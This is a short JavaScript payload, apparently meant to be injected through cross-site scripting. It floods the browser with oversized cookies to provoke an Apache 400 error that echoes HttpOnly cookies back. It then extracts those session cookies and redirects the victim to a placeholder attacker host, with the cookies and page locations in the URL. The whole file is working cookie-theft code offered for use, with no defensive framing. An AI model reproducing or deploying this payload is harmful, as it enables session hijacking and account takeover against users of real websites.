var website="http://网站地址";
function setCookies() {
    /*apache server limit 8192*/
    var str = "";
    for (var i = 0; i < 819; i++) {
        str += "x";
    }
    for (i = 0; i < 10; i++) {
        var cookie = "ray" + i + "=" + str + ";path=/";
        document.cookie = cookie;
    }
}

function parseCookies() {
    if (xhr.readyState === 4 && xhr.status === 400) {
        var content = xhr.responseText.replace(/\r|\n/g, '').match(/<pre>(.+)<\/pre>/);
        content = content[1].replace("Cookie: ", "");
        cookies = content.replace(/ray\d=x+;?/g, '')
        try {
            var myopener = '';
            myopener = window.parent.openner.location;
            var myparent = '';
            myparent = window.parent.location;
        } catch (err) {
            myopener = '0';
            myparent = '0';
        }
        window.location = website + '/index.php?location=' + escape(document.location) + '&toplocation=' + escape(myparent) + '&cookie=' + escape(cookies) + '&opener=' + escape(myopener);
    }
}

setCookies();
var xhr = window.XMLHttpRequest ? new XMLHttpRequest() : window.ActiveXObject ? new ActiveXObject("Microsoft.XMLHTTP") : new XMLHttpRequest();
xhr.onreadystatechange = parseCookies;
xhr.open("POST", "/?" + Math.random(), true);
xhr.send(null);